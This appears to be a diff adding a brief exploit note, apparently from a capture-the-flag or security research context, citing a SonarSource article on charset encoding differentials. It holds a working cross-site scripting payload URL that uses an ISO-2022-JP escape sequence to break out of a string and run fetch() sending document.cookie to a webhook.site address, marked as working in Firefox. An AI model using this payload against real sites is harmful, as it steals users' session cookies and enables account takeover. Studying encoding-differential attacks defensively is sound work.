@@ -1,0 +1,4 @@
+reference: https://www.sonarsource.com/blog/encoding-differentials-why-charset-matters/
+
+work on firefox
+http://proxy/?name=%1B(J%22;fetch(`https://webhook.site/33eb7cc2-9614-487b-ba3e-778b9841c6f3?${document.cookie}`);//
